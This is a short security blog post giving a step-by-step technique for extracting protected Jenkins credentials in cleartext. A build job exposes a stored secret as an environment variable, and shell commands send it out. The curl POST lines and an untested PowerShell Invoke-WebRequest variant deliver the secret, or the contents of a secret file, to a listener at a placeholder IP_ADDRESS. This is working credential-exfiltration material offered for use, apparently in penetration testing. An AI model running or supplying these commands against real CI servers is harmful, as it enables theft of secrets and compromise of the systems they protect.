---
layout: post
title: Dumping Jenkins credentials
excerpt_separator: <!--more-->
---

A very dumb way to access Jenkins protected credentials which I have not found documented anywhere.


<!--more-->

You will need:

- A user logged in the web panel who can use a credential in a Jenkins task

- A listener in an IP address reachable from the Jenkins master node. Perfect candidates are Jenkins slaves or the master node.

I found this technique very useful for a project where some credentials were not correctly decrypted using typical tools such as [https://github.com/hoto/jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor) which extract these values from the files credentials.xml, master.key and hudson.util.Secret.

<br>

### Step 1: Use secret text(s) or file (s)

Create a task and include the credential as a variable named "TEST" checking "Use secret text(s) or file (s)" in the Environment section:

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jenkinscredentials/Screenshot_1.png)

<br>

### Step 2: Execute command line (shell) in Build Steps

Next, check "Execute command line (shell)" in Build Steps section. The trick is creating a POST request to the IP address reachable from the node and using the credential (an environmental variable) as body. Here you have two options, if the credential is a string you can use something like this:

```
whoami; ip a; curl http://IP_ADDRESS:8081/ --data-binary '{"body": "'"$TEST"'."}'
```

If the credential is a file you can create a second dummy environmental variable like this:

```
whoami; ip a; TEST2=$(cat "$TEST"); curl http://IP_ADDRESS:8081/ --data-binary '{"body": "'"$TEST2"'."}'
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jenkinscredentials/Screenshot_2.png)

The "whoami; ip a;" part is not necessary but you can use something like this to check the task is executed correctly even if step 3 fails. And you can use the port you prefer and not 8081.

In this example the Jenkins master node is a Linux system, but I guess something similar can be used in Windows using Powershell (please notice I did not test these next lines :) ):

```
$TEST2 = Get-Content $TEST -Raw
$postParams = @{credential=$TEST2;}
Invoke-WebRequest -Uri http://IP_ADDRESS:8081 -Method POST -Body $postParams
```

<br>

### Step 3: Set up a listener and (hopefully) receive the credential in cleartext

Finally, set up a listener and run the task, you should get the credential: 

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jenkinscredentials/Screenshot_3.png)


<br>
